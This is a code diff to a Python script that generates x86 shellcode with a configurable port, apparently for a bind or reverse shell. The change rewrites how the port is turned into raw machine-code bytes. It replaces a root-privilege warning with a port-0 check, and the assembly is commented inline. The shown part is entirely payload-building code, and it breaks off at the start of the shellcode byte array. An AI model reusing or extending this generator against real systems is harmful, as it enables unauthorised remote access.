@@ -20,29 +20,29 @@ if port > 65535:
     print('ERROR: Port number cannot be greater than 65535.')
     raise SystemExit
 
-if port < 1024:
-    print('WARN: Port numbers below 1024 can only be bound by root!')
+if port == 0:
+    print('ERROR: Port 0 is not usable.')
+    raise SystemExit
 
-if port < 256:
-    if len(hex(port)) < 4:
-        hexport = '0' + hex(port)[-1:]
-    else:
-        hexport = hex(port)[-2:]
+# Zero padded port in hexadecimal
+hexport = "{0:#0{1}x}".format(port, 6)
 
+# If port is below 256
+if hexport[2:4] == '00':
     HANDLE_PORT_NUMBER = ("\x80\xc6" +  # add dh <port number low bytes>
-                          bytearray.fromhex(hexport).decode('iso-8859-1') +
-                          "\x66\x52" +  # push word dx
-                          "\x31\xd2")  # xor edx, edx
-elif hex(port)[-2:] == '00':
-    HANDLE_PORT_NUMBER = ("\x80\xc2" +  # add dl <port number high bytes>
-                          bytearray.fromhex(hex(port)[2:4]).decode('iso-8859-1') +
+                          bytearray.fromhex(hexport[4:6]).decode('iso-8859-1') +
                           "\x66\x52" +  # push word dx
                           "\x31\xd2")  # xor edx, edx
 
+elif hexport[4:6] == '00':
+    HANDLE_PORT_NUMBER = ("\x80\xc2" +  # add dl <port number high bytes>
+                             bytearray.fromhex(hexport[2:4]).decode('iso-8859-1') +
+                             "\x66\x52" +  # push word dx
+                             "\x31\xd2")  # xor edx, edx
 else:
     HANDLE_PORT_NUMBER = ("\x66\x68" +  # push word <big endian port number>
-                          bytearray.fromhex(hex(port)[-4:-2]).decode('iso-8859-1') +
-                          bytearray.fromhex(hex(port)[-2:]).decode('iso-8859-1'))
+                          bytearray.fromhex(hexport[2:4]).decode('iso-8859-1') +
+                          bytearray.fromhex(hexport[4:6]).decode('iso-8859-1'))
 
 shellcode = bytearray("\x31\xdb"  # xor ebx, ebx
                       "\xf7\xe3"              # mul ebx
